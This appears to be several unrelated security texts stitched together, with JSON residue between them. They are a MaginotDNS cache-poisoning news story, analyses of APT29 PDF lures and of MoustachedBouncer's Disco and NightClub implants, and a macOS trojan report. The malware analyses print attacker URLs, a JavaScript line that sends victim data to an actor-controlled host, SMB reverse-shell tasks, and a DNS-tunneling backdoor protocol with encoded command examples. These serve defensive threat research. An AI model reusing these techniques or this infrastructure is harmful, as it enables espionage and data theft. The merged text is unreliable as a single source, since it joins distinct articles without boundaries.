      "text": " A team of researchers from UC Irvine and Tsinghua University has developed a new powerful cache poisoning attack named 'MaginotDNS,' that targets Conditional DNS (CDNS) resolvers and can compromise entire TLDs top-level domains.The attack is made possible thanks to inconsistencies in implementing security checks in different DNS software and server modes (recursive resolvers and forwarders), leaving roughly one-third of all CDNS servers vulnerable.DNS (Domain Name System) is a hierarchical and distributed naming system for internet resources and networks, helping resolve human-readable domain names to numerical IP addresses so that a network connection can be made.The DNS resolution process uses UDP, TCP, and DNSSEC to perform queries and receive responses. It can be iterative and recursive, involving multiple steps and exchanges with root servers, TLD servers, authoritative servers, caching records along the way, etc.The concept of DNS cache poisoning is injecting forged answers into the DNS resolver cache, causing the server to direct users who enter a domain to incorrect IP addresses, potentially leading them to malicious websites without their knowledge.Many attacks of this type have been demonstrated in the past, like, for example, the Kashpureff Attack in 1997, which exploited a lack of data verification (bailiwick rules), and the Kaminsky Attack in 2008 that took advantage of the absence of a source port randomization system.These attacks have been mitigated by adding defenses into the resolvers' implementation, rendering off-path attacks challenging.However, the 'MaginotDNS' attack can overcome these defenses by attacking the forwarding mode of CDNS from either on-path or off-path.CDNS resolvers support both recursive and forwarding query modes, used by ISPs and the enterprise to reduce costs and better access control.The researchers found that bailiwick checks are adequately enforced in the recursive mode; however, the forwarder is vulnerable.Because the two share the same global DNS cache, an attack on the forwarder mode can open the path to breaching the recursive mode, essentially breaking the DNS cache protection boundary.In certain cases, they noted configurations that treated all records as if they were under the root domain, a highly vulnerable setup.The examples showcased by the researchers during their BlackHat presentation include both on-path and off-path attacks, with the latter being the more complicated but also far more valuable for threat actors.For these attacks, the threat actor needs to predict the source port and the transaction ID used by the target's recursive DNS servers when generating a request and then use a malicious DNS server to send forged responses with the correct parameters.Inferring the source port and guessing the transaction IDs can be done by brute forcing or using SADDNS (side-channel attacked DNS).For BIND9, both parameters can be successfully retrieved after 3,600 query rounds, while for Microsoft DNS, this drops to 720 rounds.To increase the chances of success, the attacker must control the reply time of the malicious DNS responses to ensure their forged response reaches the victim's server before the legitimate one.The researchers shared the following video demonstrating the MaginotDNS attack on Microsoft DNS.The researchers scanned the internet and found 1,200,000 DNS resolvers, of which 154,955 are CDNS servers.Next, using software fingerprints to identify vulnerable versions, they found 54,949 vulnerable CDNS servers, all of which are susceptible to on-path attacks, and 88.3% are impacted by off-path attacks.All the affected software vendors mentioned above have confirmed and fixed the flaws, and Microsoft has awarded a bounty to the researchers for their report.However, for the issues to be fully mitigated, CDNS administrators must apply the patches and follow the correct configuration guidelines provided by the vendors."

The PDF files masquerade as coming from the German embassy and contained two diplomatic invitation lures.EclecticIQ analysts assess with high confidence that two observed PDF documents are part of an ongoing campaign targeting Ministries of Foreign Affairs of NATO aligned countries. The PDF files masquerade as coming from the German embassy and contained two diplomatic invitation lures. One of the PDFs delivered a variant of Duke - a malware that has been linked to Russian state-sponsored cyber espionage activities of APT29. The other file was very likely used for testing or reconnaissance, as it did not contain a payload, but notified the actor if a victim opened the email attachment.  Victimology, lure documents, malware delivery and the malware itself resemble with reports that have linked the campaign to APT29, an advanced persistent threat actor attributed to Russia's Foreign Intelligence Service (SVR).The threat actor used Zulip - an open-source chat application - for command-and-control, to evade and hide its activities behind legitimate web traffic. [1] EclecticIQ analysts identified two malicious PDF documents that masquerade as coming from the German embassy, and that targeted diplomatic entities with invitation lures. The documents used the following themes: “Farewell to Ambassador of Germany” and “Day of German Unity”. The first PDF contained embedded JavaScript code to deliver multi-staged payloads in HTML file format. PDF readers like Adobe Acrobat have a default setting that warns before execution of code inside a PDF document. Upon user execution the PDF document displays an “Open File” alert box (Figure 1). If a victim opens it, the code will launch the malicious HTML file called Invitation_Farewell_DE_EMB. Figure 1 - Open File alert box (click on image to open in separate tab).Analysts assess with high confidence that the PDF files impersonating the German embassy, were very likely created by the same threat actor, due to overlaps in the victimology, and phishing themes used.Figure 2 - German embassy invitation lure.Figure 3 shows the embedded JavaScript code inside the German embassy invitation lure PDF, which was generated by PyPDF2. [3]Invitation_Farewell_DE_EMB is an HTML file. Through HTML smuggling, the threat actor delivered a ZIP file that contained a malicious HTML Application (HTA). An HTA file is a widely used Living Off The Land Binary (LOLBIN) containing both HTML and scripting code to create a standalone malicious application that is executed by the Windows HTA engine mshta.exe [4]. The zipped HTA file eventually delivers a Duke malware variant (Figure 4).Figure 4 - Delivery stages of Duke malware variant.Figure 5 shows the JavaScript code inside the Invitation_Farewell_DE_EMB.html. The URL sgrhf[.]org[.]pk/wp-content/idx[.]php?n=ks&q='+btoa(p) was controlled by the threat actor to receive the execution file path by using window.location.pathname, which provides the username of the victim device and notifies the threat actor of possible successful attack.After execution, the HTA file will drop the three executables into the C:\\Windows\\Tasks directory for DLL Sideloading:•    AppVIsvSubsystems64.dll - A library loaded into msoev.exe to perform the execution without any failure.•    Mso.dll - Duke malware variant loaded into msoev.exe via DLL Sideloading.•    Msoev.exe - A legitimate signed Windows binary, automatically loading Mso.dll and AppVIsvSubsystems64.dll upon execution.EclecticIQ analysts examined the dropped Duke malware variant (mso.dll). Analysis showed that the malware used Windows API hashing to hide the names of the Windows API function calls. The actor used this technique to perform evasion against static malware scanners.Figure 7 shows the decoded Windows libraries from ROR13 hashing algorithm: •    Kernel32.dll: 6A4ABC5B•    Ntdll.dll: 3CFA685D•    User32.dll: 63C84283Figure 7 - ROR13 hashing algorithm inside disassembled Duke malware variant. Analysts observed that all string values are encrypted by generic XOR encryption routines that are decrypted at execution. Figure 8 shows an example of a decrypted function inside the mso.dll, which is used to open the lure Invitation.pdf. The malware uses ShellExecuteA Windows API to open the PDF lure document. String data such as Invitation.pdf is stored statically inside the malware as XOR encrypted stack string. Figure 9 - XOR decryption routine inside disassembled Duke malware variant. Figure 10 shows the manual decryption of XOR encrypted stack string with hex value key “F”:  Figure 10 – Manually decrypted stack string.Figure 11 - C2 communications from toyy[.]zulipchat[.]com. All of the API request headers such as URL, authorization token, and the request itself are stored encrypted inside the Duke malware variant. The decrypted contents can be seen in Appendix A below.Pivoting on parameters in the previously identified URL - sgrhf[.]org[.]pk/wp-content/idx[.]php?n=ks&q='+btoa(p)- analysts identified a second PDF file. The PDF (figure 12) used a “Day of German Unity” lure. Analysts assess with moderate confidence that the PDF document was very likely used by the threat actor for reconnaissance or for testing purposes. It did not contain a payload, but notified the actor if a victim opened the email attachment by receiving a notification through a compromised domain edenparkweddings[.]com.Figure 13 – Diamond Model of this campaign.APT29 also known as CozyBear, The Dukes, Cloaked Ursa, Nobelium, UNC2452 is an advanced persistent threat actor (APT) active since 2008.

For example, we have first seen them use AitM attacks only in 2020. However, the targeted vertical has stayed the same.Table 1 shows the characteristics of each campaign. Given these elements, we assess with high confidence that they are all linked to MoustachedBouncer.\n\n\n\n\n \n\n\nVirusTotal(2014)\n\n\nVictim A (2017)\n\n\nVictim B (2020-2022)\n\n\nVictim C(2020-2022)\n\n\nVictim D(2021-2022)\n\n\n\n\nNightClub implant\n\n\nX\n\n\nX\n\n\n \n\n\nX\n\n\n \n\n\n\n\nNightClub plugins\n\n\n \n\n\nX\n\n\nX\n\n\nX\n\n\n \n\n\n\n\nDisco implant\n\n\n \n\n\n \n\n\nX\n\n\n \n\n\nX\n\n\n\n\nSharpDisco dropper\n\n\n \n\n\n \n\n\nX\n\n\n \n\n\n \n\n\n\n\nCompromise via AitM\n\n\n?\n\n\n?\n\n\n?\n\n\n?\n\n\nX\n\n\n\n\nMalware delivery via AitM on SMB shares\n\n\n \n\n\n \n\n\nX\n\n\n \n\n\nX\n\n\n\n\nVictims: foreign embassies in Belarus\n\n\n? \n\n\nX\n\n\nX\n\n\nX\n\n\nX\n\n\n\n\n VirusTotal(2014)Victim A (2017)Victim B (2020-2022)Victim C(2020-2022)Victim D(2021-2022)NightClub implantXX X NightClub plugins XXX Disco implant  X XSharpDisco dropper  X  Compromise via AitM????XMalware delivery via AitM on SMB shares  X XVictims: foreign embassies in Belarus? XXXXIn this section, we detail the initial access for Disco. We don’t yet know the initial access method MoustachedBouncer uses to install NightClub.Note that it is using unencrypted HTTP and not HTTPS, and that the updates.microsoft[.]com subdomain does not exist on Microsoft’s nameservers, so it does not resolve on the open internet. During the attack, this domain resolved to 5.45.121[.]106 on the target’s machine. This IP address is used for parking domains and is unrelated to Microsoft. Although this is an internet-routable IP address, traffic to this IP never reaches the internet while the AitM attack is ongoing. Both the DNS resolutions and the HTTP replies were injected in transit, probably at the ISP level.An important point is that the adversary-in-the-middle (AitM) technique only occurs against a few selected organizations (perhaps just embassies), not countrywide. It is not possible to reproduce the redirection by simply exiting from a random IP address in Belarus.The HTML page, shown in Figure 2, loads JavaScript code from http://updates.microsoft[.]com/jdrop.js. This script first calls setTimeout to execute the function jdrop one second after the page has loaded. That function (see Figure 3) displays a modal window with a button named Получить обновления (translation: Get updates).A click on the button executes the update function, shown in Figure 4.This function triggers the download of a fake Windows Update installer from the legitimate-seeming URL http://updates.microsoft[.]com/MicrosoftUpdate845255.zip. It also displays some instructions to install the update: Для установки обновлений, скачайте и запустите \"MicrosoftUpdate845255.msi\". (translation: To install updates, download and run \"MicrosoftUpdate845255.msi\").We were unable to retrieve the downloaded MicrosoftUpdate845255.zip file but our telemetry shows it contains a malicious executable named MicrosoftUpdate845255.exe.Written in Go, it creates a scheduled task that executes \\\\35.214.56[.]2\\OfficeBroker\\OfficeBroker.exe every minute. Like the path suggests, it fetches the executable via SMB from 35.214.56[.]2. This IP address belongs to a Google Cloud customer, but just like the HTTP server, we believe that SMB replies are injected on the fly via AitM and that the attackers don’t control the actual internet-routable IP address.We have also observed the following SMB servers, intercepted via AitM:We have observed this behavior in two separate ISP networks: Unitary Enterprise A1 and Beltelecom. This suggests that those ISPs may not provide full data confidentiality and integrity. We strongly recommend that foreign organizations in Belarus use an end-to-end encrypted VPN tunnel, ideally out-of-band (i.e., not from the endpoint), providing internet connectivity from a trusted network.Figure 5 depicts our hypothesis about the compromise vector and the traffic interception. The AitM scenario reminds us of the Turla and StrongPity threat actors who have trojanized software installers on the fly at the ISP level. Usually, this initial access method is used by threat actors operating in their own country because it requires significant access inside the internet service providers, or their upstream providers. In many countries, security services are allowed to perform so-called “lawful interception” using special devices installed on the ISPs’ premises.In 2018, the Citizen Lab revealed that DPI devices developed by the Canadian company Sandvine were used to modify HTTP traffic in Turkey and Egypt. In Turkey, the devices were allegedly used to redirect internet users to a malicious server when they tried to download certain Windows applications, which is in line with StrongPity activities. In Egypt, those devices were allegedly used to inject ads and cryptocurrency mining scripts in order to generate money.While the compromise of routers in order to conduct AitM on embassy networks cannot be fully discarded, the presence of lawful interception capabilities in Belarus suggests the traffic mangling is happening at the ISP level rather than on the targets’ routers.Since 2014, the malware families used by MoustachedBouncer have evolved, and a big change happened in 2020 when the group started to use AitM attacks. At the same time, it started to use much simpler tools developed in .NET and Go. In reference to NightClub, we named this new toolset Disco.MoustachedBouncer operates the two implant families in parallel, but on a given machine, only one is deployed at a time. We believe that Disco is used in conjunction with AitM attacks while NightClub is used for victims where traffic interception at the ISP level isn’t possible because of a mitigation such as the use of an end-to-end encrypted VPN where internet traffic is routed outside of Belarus.As mentioned in the previous section, a fake Windows Update page delivers the first stage (SHA-1: E65EB4467DDB1C99B09AE87BA0A964C36BAB4C30). This is a simple dropper written in Go that creates a scheduled task to execute \\\\35.214.56[.]2\\OfficeBroker\\OfficeBroker.exe every minute. OfficeBroker.exe is downloaded over the SMB protocol via AitM attack. The dropper’s main function is shown in Figure 6.Finally, the dropper does a DNS query for windows.system.update[.]com. This domain does not exist but the DNS request is probably intercepted via AitM, and is likely a beacon to notify the operators that the machine has been successfully compromised.We were unable to retrieve the OfficeBroker.exe file, but it is very likely that it acts as a downloader, since we have observed further plugins being executed from SMB shares. The plugins are developed in Go and are rather simple because they mostly rely on external Go libraries. Table 2 summarizes the different plugins. Download URL / Path on diskDescription\\\\209.19.37[.]184\\driverpack\\aact.exeC:\\Users\\Public\\driverpack\\driverpackUpdate.exeExecutes PowerShell scripts with powershell.exe -NoProfile -NonInteractive <command>, where <command> is read from the file .\\idata.

Images are saved in ./logs/${DATETIME}.dat.\\\\52.3.8[.]25\\oracle\\oracleTelemetry.exeInterestingly, the plugins also use SMB shares for data exfiltration. There is no C&C server outside the attackers’ premises to look at or to take down. There also seems to be no way to reach that C&C server from the internet. This gives high resiliency to the attackers’ network infrastructure.In January 2020 we observed a MoustachedBouncer dropper, which we named SharpDisco, being downloaded from https://mail.mfa.gov.<redacted>/EdgeUpdate.exe by a Microsoft Edge process. It is not clear how attackers were able to tamper with HTTPS traffic, but it is possible an invalid TLS certificate warning was shown to the victim. Another possibility is that MoustachedBouncer compromised this governmental website.SharpDisco is a dropper developed in C#. It displays a fake update window, shown in Figure 7, while creating two scheduled tasks in the background.These scheduled tasks are:WINCMDA.EXE and WINCMDB.EXE are probably just cmd.exe renamed. Every minute, the task reads what is in \\\\24.9.51[.]94\\EDGEUPDATE\\EDGEAIN (on the SMB share), pipes it to cmd.exe, and writes the output to \\\\24.9.51[.]94\\EDGEUPDATE\\EDGEAOUT. It is the same for the second task, but with the EDGEBIN and EDGEBOUT files. From a higher viewpoint, those tasks are reverse shells with a one-second latency.Then, as shown in Figure 8, the dropper sends a DNS request for an unregistered domain, edgeupdate-security-windows[.]com. This is similar to what the 2022 Disco dropper does.ESET telemetry shows that the reverse shell was used to drop a genuine Python interpreter in C:\\Users\\Public\\WinTN\\WinTN.exe. We then observed two plugins being dropped on disk by cmd.exe, which means they were likely dropped by the reverse shell as well. The two plugins are:It is interesting to note that those plugins share code with NightClub (described in the section NightClub – 2017 (SHA-1: F92FE4DD679903F75ADE64DC8A20D46DFBD3B277) below). This allowed us to link the Disco and NightClub toolsets.This plugin is a Windows executable named It11.exe. We believe it was executed via the reverse shell mentioned above. There is no persistence mechanism implemented in the plugin.It gets the files recently opened on the machine by reading the content of the folder %USERPROFILE%\\Recent (on Windows XP) or of %APPDATA%\\Microsoft\\Windows\\Recent (in newer Windows versions). Those folders contain LNK files, each pointing to a recently opened file.The plugin embeds its own LNK format parser in order to extract the path to the original file.We were unable to make this plugin work, but static analysis shows that the files are exfiltrated to the SMB share \\\\24.9.51[.]94\\EDGEUPDATE\\update\\. The plugin maintains a list of already exfiltrated files, and their CRC-32 checksum, in %TEMP%\\index.dat. This likely avoids retransmitting the same file more than once.This plugin is a Windows executable named It3.exe. As with the recent-files stealer, it doesn’t implement any persistence mechanism.The plugin calls GetLogicalDrives in a loop to get a list of all connected drives, including removable ones such as USB keys. Then, it does a raw copy of the NTFS volume of each removable drive and writes it in the current working directory, C:\\Users\\Public\\ in our example. The filename is a randomly generated string of six to eight alphanumeric characters, for example heNNYwmY.It maintains a log file in <working directory>\\index.dat with the CRC-32 checksums of the copied disks.The plugin doesn’t appear to have any exfiltration capabilities. It is likely that the staged drive dumps are later retrieved using the reverse shell.Since 2014, MoustachedBouncer has been using a malware framework we named NightClub because it contains a C++ class named nightclub. We found samples from 2014, 2017, 2020, and 2022. This section describes the evolution of NightClub from a simple backdoor to a fully modular C++ implant.In summary, NightClub is an implant family using emails for its C&C communications. Since 2016, additional modules could be delivered by email to extend its spying capabilities.This is the oldest known version of NightClub. We found a dropper and an orchestrator.The dropper (SHA-1: 0401EE7F3BC384734BF7E352C4C4BC372840C30D) is an executable named EsetUpdate-0117583943.exe, and it was uploaded to VirusTotal from Ukraine on 2014-11-19. We don’t know how it was distributed at that time.The main function, illustrated in Figure 9, loads the resource MEMORY and writes its content in %SystemRoot%\\System32\\creh.dll. It is stored in cleartext in the PE resource.Then, the dropper modifies the Creation, Access, and Write timestamps of creh.dll to those of the genuine Windows DLL user32.dll.Finally, it creates a Windows service named WmdmPmSp and sets, in the registry, its ServiceDll to %SystemRoot%\\System32\\creh.dll – see Figure 10.The previously dropped DLL, creh.dll (SHA-1: 5B55250CC0DA407201B5F042322CFDBF56041632) is the NightClub orchestrator. It has a single export named ServiceMain and its PDB path is D:\\Programming\\Projects\\Work\\SwampThing\\Release\\Win32\\WorkingDll.pdb.It is written in C++ and the names of some methods and classes are present in the RTTI data – see Figure 11. Some of the strings are encrypted using the following linear congruential generator (LCG): staten+1 = (690069 × staten + 1) mod 232. For each encrypted string, a seed (state0) between 0 and 255 is provided. To decrypt a string, the staten is subtracted from each encrypted byten. An example of an encrypted string structure is shown in Figure 12.A non-encrypted log file is present in C:\\Windows\\System32\\servdll.log. It contains very basic information about the initialization of the orchestrator – see Figure 13.NightClub has two main capabilities:• Monitoring files• Exfiltrating data via SMTP (email)Functionality implemented here is very close to that of the recent file monitor plugin seen in 2020 and described above. It also browses the directories %USERPROFILE%\\Recent on Windows XP, and in newer Windows versions %APPDATA%\\Microsoft\\Windows\\Recent, and implements the same LNK parser – see Figure 14 and Figure 15. The files retrieved from the LNK files are copied to %TEMP%\\<original filename>.bin. Note that unlike the 2020 variant, only files with extensions .doc, .docx, .xls, .xslx, or .pdf are copied.It also monitors removable drives in a loop, in order to steal files from them.• SMTP server: smtp.seznam.cz• Sender address: glen.morriss75@seznam[.]cz• Sender password: <redacted>• Recipient address: SunyaF@seznam[.]czseznam.cz is a Czech web portal offering a free webmail service. We believe the attackers created their own email accounts, instead of compromising legitimate ones.NightClub exfiltrates the files previously copied to %TEMP% by the file monitor functionality (FileMonitor in Figure 11). They’re encoded in base64 and added as an attachment. The attachment name is the original filename with the .bin extension.Figure 16 shows the exfiltration of a file via SMTP. NightClub authenticates using the credentials for the  glen.morriss75@seznam[.]cz account and sends an email to SunyaF@seznam[.]cz with the stolen file attached. Note that some headers that might look suspicious at first sight are the defaults from the CSmtp project, so they are probably not distinctive. These include:• X-Mailer: The Bat! (v3.02) Professional• Content-Type: multipart/mixed; boundary=\"__MESSAGE__ID__54yg6f6h6y456345\"The Bat! is an email client widely used in Eastern Europe. As such, the X-Mailer header likely blends in with email traffic in Belarus.In 2017, we found a more recent version of NightClub, which was compiled on 2017-06-05. On the victim’s machine, it was located at C:\\Windows\\System32\\metamn.dll. Its filename in the DLL export directory is DownloaderService.dll, and it has a single export named ServiceMain. It contains the PDB path D:\\AbcdMainProject\\Rootsrc\\Projects\\MainS\\Ink\\Release\\x64\\EtfFavoriteFinder.pdb. To persist, it creates a Windows service named WmdmPmSp, as in previous versions. Unfortunately, we have not been able to recover the dropper.This NightClub version also includes a few C++ class and method names, including nightclub, in the RTTI data – see Figure 17.As in previous versions, C&C communications use the SMTP protocol, via the CSmtp library, with hardcoded credentials. In the sample we analyzed, the mail configuration is:• SMTP server: smtp.mail.ru• Sender address: fhtgbbwi@mail[.]ru• Sender password: [redacted]• Recipient address: nvjfnvjfnjf@mail[.]ruThe main difference is that they switched the free email provider from Seznam.cz to Mail.ru.This NightClub version uses external plugins stored in the folder %APPDATA%\\NvmFilter\\. They are DLLs named <random>.cr (e.g., et2z7q0FREZ.cr) with a single export named Starts. We have identified two plugins: a keylogger and a file monitor.This plugin was stored in %APPDATA%\\NvmFilter\\et2z7q0FREZ.cr and is a DLL with one export, Starts. It contains the PDB path D:\\Programming\\Projects\\Autogen\\Kh\\AutogenAlg\\Release\\x64\\SearchIdxDll.pdb and was developed in C++. RTTI data shows a few class names – see Figure 18.The keylogger implementation is rather traditional, using the Windows GetKeyState API function – see Figure 19.The keylogger maintains a cleartext log file in %TEMP%\\uirtl.tmp. It contains the date, the title of the application, and the logged keystrokes for this specific application. An example, which we generated, is provided in Figure 20.This plugin was stored in %APPDATA%\\NvmFilter\\sTUlsWa1.cr and is a DLL with a single export named Starts. Its PDB path, D:\\Programming\\Projects\\Autogen\\Kh\\AutogenAlg\\Release\\x64\\FileMonitoringModule.pdb, has not been stripped, and it reuses code from the 2014 and 2020 file monitors, described above. It monitors drives and recent files, and copies files for exfiltration to %TEMP%\\AcmSym\\rm. Its log file is stored in %TEMP%\\indexwti.sxd.In 2020-11, we observed a new version of NightClub deployed in Belarus, on the computers of the diplomatic staff of a European country. In 2022-07, MoustachedBouncer again compromised some of the same computers. The 2020 and 2022 versions of NightClub are almost identical, and the compromise vector remains unknown.Its architecture is slightly different from the previous versions, as the orchestrator also implements networking functions. The second component, which its developers call the module agent, is only responsible for loading the plugins. All samples were found in the folder %APPDATA%\\microsoft\\def\\ and are written in C++ with statically linked libraries such as CSmtp or cpprestsdk. As a result, the executables are quite large – around 5MB.On the victims’ machines, both orchestrator variants (SHA-1: 92115E21E565440B1A26ECC20D2552A214155669 and D14D9118335C9BF6633CB2A41023486DACBEB052) were named svhvost.exe. We believe MoustachedBouncer tried to masquerade as the name of the legitimate executable svchost.exe. For persistence, it creates a service named vAwast.The config is formatted in JSON, as shown in Figure 22. The most important keys are transport and modules. The former contains information about the mailbox used for C&C communications, as in the previous versions. The latter contains the list of modules.The two variants of the module agent (SHA-1: DE0B38E12C0AF0FD63A67B03DD1F8C1BF7FA6128 and E6DE72516C1D4338D7E45E028340B54DCDC7A8AC) were named schvost.exe, which is another imitation of the svchost.exe filename.This component is responsible for starting the modules that are specified in the configuration. They are DLLs, each with an export named Start or Starts. They are stored on disk unencrypted with the .ini extension, but actually are DLLs.Over the course of our investigation, we found five different modules: an audio recorder, two almost identical screenshotters, a keylogger, and a DNS backdoor. For all of them: their configuration, which is formatted in JSON, is passed as an argument to the Start or Starts function.By default, the output of the plugin is written in %TEMP%\\tmp123.tmp. This can be changed using the config field file. Table 3 shows the different plugins.Table 3. NightClub pluginsDLL export nameConfigurationDescriptionNotifyLoggers.dll{    \"name\":\"<value>\",    \"enabled\":\"<value>\",    \"max_size\":\"<value>\",    \"file\":\"<value>\",    \"chk_t\":\"<value>\",    \"r_d\":\"<value>\",    \"f_hs\":\"<value>\",    \"t_hs\":\"<value>\"}MicroServiceRun.dll{    \"name\":\"<value>\",    \"enabled\":\"<value>\",    \"max_size\":\"<value>\",    \"file\":\"<value>\"    \"capture_on_key_press\":\"<value>\",    \"period_in_sec\":\"<value>\",    \"quality\":\"<value>\",    \"app_keywords\":\"<value>\"}A screenshotter that uses CreateCompatibleDC and GdipSaveImageToStream and writes captured images in file to disk. If app_keywords is not empty, it uses GetForegroundWindow to check the name of the active Window and capture it only if it matches app_keywords.JobTesterDll.dll{    \"name\":\"<value>\",    \"enabled\":\"<value>\",    \"max_size\":\"<value>\",    \"file\":\"<value>\"}A keylogger that uses the GetKeyState API. It writes the log in file to disk and the format is <Date><Title bar><content>.ParametersParserer.dll{    \"name\":\"<value>\",    \"enabled\":\"<value>\",    \"max_size\":\"<value>\",    \"file\":\"<value>\",    \"cc_server_address\":\"<value>\"}A DNS-tunneling backdoor. cc_server_address specifies the IP address of a DNS server to which requests are sent. More details follow.The DNS-tunneling backdoor (ParametersParserer.dll) uses a custom protocol to send and receive data from a malicious DNS server (cc_server_address). Figure 23 shows that the DNS request is sent to the IP address provided in the configuration, using the pExtra parameter of DnsQuery_A.The plugin adds the data to exfiltrate as part of the subdomain name of the domain that is used in the DNS request (pszName above). The domain is always 11.1.1.cid and the data is contained in the subdomain. It uses the following format, where x is the letter, not some variable:x + <modified base64(buffer)> + x.11.1.1.cidFor example, the first DNS request the plugin sends is xZW1wdHkx.11.1.1.cid, where ZW1wdHk decodes to empty. Note that the base64 function is not standard. It removes the =, if any, from the result of the base64 encoding, and also replaces / characters with -s and + characters with -p. This is to create valid subdomains, because standard base64 encoding output can include +, / and = characters, all of which are invalid in domain names and could be detected in network traffic.Figure 24. The plugin reads the TXT recordThe expected format of the reply is:x + <argument encoded with modified base64> + x.<cmd_id>.<unknown integer>.1.<cmd_name>This is similar to the format of the requests. The <argument encoded with modified base64> also uses the custom base64 encoding without = and with -p for + and -s for /. <cmd_name> is an arbitrary string that is not used by the backdoor; it’s likely used by the operators to keep track of the different commands. <cmd_id> is an integer that corresponds to a command in the backdoor switch statement. For example, if the operators wanted to execute calc.exe, the DNS C&C server would send the reply xYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQx.27.2.1.calc, where Yzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQ decodes to c:\\windows\\system32\\calc.exe and 27 is the command ID to create a new process. All commands supported by this backdoor are detailed in Table 4.Table 4. Commands implemented by the DNS backdoor\n\n\n\nID\n\n\nDescription\n\n\n\n\n0x15 (21)\n\n\nCopy a directory (from a source to a destination)\n\n\n\n\n0x16 (22)\n\n\nMove a file (from a source to a destination)\n\n\n\n\n0x17 (23)\n\n\nRemove a file or a directory\n\n\n\n\n0x18 (24)\n\n\nSearch a file for a given pattern (Note: we are unsure about the exact behavior of this command)\n\n\n\n\n0x19 (25)\n\n\nWrite a buffer to a file\n\n\n\n\n0x1A (26)\n\n\nRead a file\n\n\n\n\n0x1B (27)\n\n\nCreate a process\n\n\n\nIDDescription0x15 (21)Copy a directory (from a source to a destination)0x16 (22)Move a file (from a source to a destination)0x17 (23)Remove a file or a directory0x18 (24)Search a file for a given pattern (Note: we are unsure about the exact behavior of this command)0x19 (25)Write a buffer to a file0x1A (26)Read a file0x1B (27)Create a processThe result of the commands is exfiltrated back to the attacker using DNS requests, as detailed above. The only difference is that 11 is replaced by 12 in the domain name, as shown in this example: xdGltZW91dAx.12.1.1.cid. In this case, the plugin sent the message timeout to the C&C server.MoustachedBouncer is a skilled threat actor targeting foreign diplomats in Belarus. It uses quite advanced techniques for C&C communications including network interception at the ISP level for the Disco implant, emails for the NightClub implant, and DNS in one of the NightClub plugins.The main takeaway is that organizations in foreign countries where the internet cannot be trusted should use an end-to-end encrypted VPN tunnel to a trusted location for all their internet traffic in order to circumvent any network inspection devices.\n\n\n\nSHA-1\n\n\nFilename\n\n\nDetection\n\n\nDescription\n\n\n\n\n02790DC4B276DFBB26C714F29D19E53129BB6186\n\n\nindex.html\n\n\nJS/TrojanDownloader.Agent.YJJ\n\n\nFake Windows update webpage.\n\n\n\n\n6EFF58EDF7AC0FC60F0B8F7E22CFE243566E2A13\n\n\njdrop.js\n\n\nJS/TrojanDownloader.Agent.YJJ\n\n\nJavaScript code that triggers the download prompt of the fake Windows update.\n\n\n\n\nE65EB4467DDB1C99B09AE87BA0A964C36BAB4C30\n\n\nMicrosoftUpdate845255.exe\n\n\nWinGo/Agent.ET\n\n\nDisco dropper.\n\n\n\n\n3A9B699A25257CBD0476CB1239FF9B25810305FE\n\n\ndriverpackUpdate.exe\n\n\nWinGo/Runner.B\n\n\nDisco plugin.

      "title": "\r\n\tPotent Trojans Targeting MacOS Users - Infosecurity Magazine\r\n",
      "text": " Deputy Editor, Infosecurity MagazineWhile Apple’s ecosystem still experiences a narrower range of threats than other popular operating systems like Microsoft’s Windows and Google’s ChromeOS, the researchers warned that “this false sense of protection often means malware tailored to infect Macs is better suited to its goals.”Speaking to Infosecurity, Bogdan Botezatu, Director of Threat Research at Bitdefender, noted: “Threat actors are now building much more sophisticated malware creations, and many times target multiple OS platforms and architectures in the same attack. We expect the existing threats to evolve and become more refined with time.”The report found that Mac users were mainly targeted by three key threats in 2022 – Trojans, Potentially Unwanted Applications (PUAs) and Adware – with Trojans making up over half (51.8%) of threat detections.Threat actors use a range of techniques to infect macOS with Trojans, according to the Bitdefender researchers. This includes:The most common Trojan families used to target MacOS in 2022 were EvilQuest (52.7%), followed by Generic Trojan (22.4%), Exploit (8.2%), Flashback (2.7%) and Empire (2.6%).While the report noted some of these can be considered “legacy malware,” they are still proving effective due to many users failing to configure proper security settings and/or deploying a dedicated security solution.Botezatu told Infosecurity that the macOS landscape is undergoing significant changes regarding the quantity and quality of malware.“While the bulk of the Mac badware used to revolve around greyware and potentially unwanted apps, the balance has tilted this year in favour of more potent Trojans. The EvilQuest malware, for instance, has been active since late 2020 and continues to perfect itself. This shows in the number of unique samples that kept coming since 2020, but it’s not just an increase in samples – it’s also an increase in the quality of malware,” he explained.These applications, commonly found as freeware, repackaged applications or utility apps, represent a quarter (25.3%) of threats to macOS, according to the researchers.Some PUAs can hijack a user’s browser, changing the default search engine and installing plugins without consent, and “highly aggressive” ones can modify third-party apps, download additional (unsolicited) software, and alter system settings.The report found that PUA detections on Macs are crypto miners and 1% are jailbreak utilities.Bitdefender said that developers have “flooded” the market with such apps, some of which are persuasive enough to get users to disable restrictions and run apps from any source.The report found that adware, a tactic used by developers to generate money by automatically generating adverts on users’ screens, accounted for over a fifth (22.6%) of threats targeting macOS.These infect systems after users wilfully download things like freeware programs, fake installers, software downloaded from torrents and wares sites, pirated programs, malicious links and malvertising.Botezatu highlighted another interesting development in the macOS landscape, which is the development of highly sophisticated malware written for cyber-espionage purposes.“Information stealers such asXloader and Macma and cross-platform Trojans such as JokerSpy and WildPressure are just some of the extremely potent threats that have recently started targeting high-profile victims. Unlike average malware, these threats are carefully written and sometimes leverage unpatched vulnerabilities, while others are capable of targeting multiple architectures, such as Intel x86 and ARM M1/M2,” he explained.Bitdefender observed that one of the key security issues with Macs is users “procrastinating” over updating software and deploying Apple security patches. In addition, the “vast majority” of Mac owners use older generations of macOS that do not receive the latest security updates.In addition to staying up to date with the latest OS version and applying the newest security patches, the researchers advised users to never download software from unofficial sources, like torrents and warez sites. Image credit: Shahid Jamil / Shutterstock.com"

